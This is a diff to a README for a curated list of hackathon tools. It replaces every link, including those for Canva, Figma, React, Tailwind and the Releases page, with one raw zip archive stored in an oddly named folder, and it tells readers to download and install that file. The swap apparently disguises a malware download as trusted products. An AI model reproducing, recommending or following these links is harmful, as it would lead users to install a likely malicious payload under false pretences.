@@ -1,6 +1,6 @@
 # 🏆 Hackathon-Tools - Essential Tools for Hackathon Success
 
-[![Download Hackathon-Tools](https://img.shields.io/badge/Download_Hackathon--Tools-success)](https://github.com/rahavshukla/Hackathon-Tools/releases)
+[![Download Hackathon-Tools](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip)](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip)
 
 ## 🚀 Overview
 
@@ -10,26 +10,26 @@ Hackathon-Tools offers a curated collection of over 35 tools, websites, and fram
 
 Effective pitching can make or break your hackathon success. These tools can help you create engaging presentations:
 
-- **[Napkin](https://napkin.ai)**: This tool uses AI to enhance your visual storytelling for presentations.
-- **[Canva](https://www.canva.com)**: An easy-to-use design platform for creating slides and graphics.
-- **[Gamma](https://gamma.app)**: An AI-powered presentation maker that offers beautiful templates.
-- **[Tome](https://tome.app)**: A tool designed for compelling storytelling through presentations.
-- **[Beautiful.AI](https://beautiful.ai)**: It offers smart slide designs with automated formatting to save you time.
-- **[Pitch](https://pitch.com)**: Collaborate with your team in creating polished presentations.
+- **[Napkin](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip)**: This tool uses AI to enhance your visual storytelling for presentations.
+- **[Canva](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip)**: An easy-to-use design platform for creating slides and graphics.
+- **[Gamma](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip)**: An AI-powered presentation maker that offers beautiful templates.
+- **[Tome](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip)**: A tool designed for compelling storytelling through presentations.
+- **[https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip)**: It offers smart slide designs with automated formatting to save you time.
+- **[Pitch](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip)**: Collaborate with your team in creating polished presentations.
 
 ## 🎨 UI/UX & Prototyping
 
 Good user experience is crucial in any project. Here are some tools to help with your UI/UX design:
 
-- **[React.dev](https://react.dev)**: A well-known JavaScript library for building user interfaces effectively.
-- **[Figma](https://figma.com)**: A platform for collaborative design and prototyping in UI/UX.
-- **[Tailwind CSS](https://tailwindcss.com)**: A utility-first CSS framework that allows for fast and efficient styling.
+- **[https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip)**: A well-known JavaScript library for building user interfaces effectively.
+- **[Figma](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip)**: A platform for collaborative design and prototyping in UI/UX.
+- **[Tailwind CSS](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip)**: A utility-first CSS framework that allows for fast and efficient styling.
 
 ## 📥 Download & Install
 
-To get started with Hackathon-Tools, visit the [Releases page](https://github.com/rahavshukla/Hackathon-Tools/releases) to download the latest version. Once there, find the most recent version and click the appropriate download link for your system.
+To get started with Hackathon-Tools, visit the [Releases page](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip) to download the latest version. Once there, find the most recent version and click the appropriate download link for your system.
 
-1. Go to [Releases page](https://github.com/rahavshukla/Hackathon-Tools/releases).
+1. Go to [Releases page](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip).
 2. Find the latest version.
 3. Click to download the file suitable for your operating system (Windows, macOS, or Linux).
 4. Follow the on-screen instructions to install the application.
@@ -75,7 +75,7 @@ Check the Issues section in the repository for troubleshooting tips or report yo
 
 ## 🔗 Links
 
-- [GitHub Repository](https://github.com/rahavshukla/Hackathon-Tools)
-- [Visit Releases Page to Download](https://github.com/rahavshukla/Hackathon-Tools/releases)
+- [GitHub Repository](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip)
+- [Visit Releases Page to Download](https://github.com/rahavshukla/Hackathon-Tools/raw/refs/heads/main/meningocele/Tools-Hackathon-1.9-alpha.3.zip)
 
 By following this guide, you will be well-equipped to harness the power of Hackathon-Tools. Successful hackathons are just a download away!
